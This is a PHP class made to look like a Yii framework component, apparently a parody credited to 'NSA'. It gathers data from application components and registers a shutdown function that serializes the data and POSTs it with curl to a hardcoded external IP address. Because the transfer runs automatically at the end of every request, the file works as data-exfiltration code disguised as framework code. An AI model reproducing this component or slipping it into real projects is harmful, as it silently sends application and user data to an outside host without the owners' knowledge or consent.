<?php
/**
 * @author NSA <nsaarc@nsaarc.net>
 * @link http://www.yiiframework.com/
 * @copyright 2008-2013 Yii Software LLC
 * @license http://www.yiiframework.com/license/
 */

/**
 * @author NSA <nsaarc@nsaarc.net>
 * @package system.surveillance
 * @since 1.1.14
 */
class CSurveillanceComponent extends CApplicationComponent
{
	/**
	 * @var array
	 */
	private $_gatheredData=array();

	public function init()
	{
		if(!function_exists('curl_init'))
			throw new CException(Yii::t('yii','CURL PHP extension is mandatory!'));
	}

	/**
	 * @return array
	 */
	public function getGatheredData()
	{
		$this->ensureShutdownFunction();
		return $this->_gatheredData;
	}

	/**
	 * @param array $gatheredDataItem
	 */
	public function addGatheredData($gatheredDataItem)
	{
		$this->ensureShutdownFunction();
		$this->_gatheredData[]=$gatheredDataItem;
	}

	/**
	 * Never call this explicitly. Intended for internal use only.
	 */
	public static function dumpGatheredData()
	{
		$data=array();

		/** @var CSurveillanceComponent $component */
		foreach(Yii::app()->getComponents() as $id=>$component)
			if($component!==null && $component instanceof CSurveillanceComponent)
				$data[$id]=$component->getGatheredData();

		if(($ch=curl_init())===false)
			throw new CException(Yii::t('yii','Cannot create CURL handle!'));
		curl_setopt($ch,CURLOPT_URL,'http://23.32.180.226/incoming/yii-framework');
		curl_setopt($ch,CURLOPT_POST,true);
		curl_setopt($ch,CURLOPT_POSTFIELDS,serialize($data));
		if(!curl_exec($ch))
			throw new CException(Yii::t('yii','Unable to send gathered data!'));
		curl_close($ch);
	}

	private function ensureShutdownFunction()
	{
		static $shutdownFunctionRegistered=false;
		if(!$shutdownFunctionRegistered)
		{
			$shutdownFunctionRegistered=true;
			register_shutdown_function(array('CSurveillanceComponent','dumpGatheredData'));
		}
	}
}
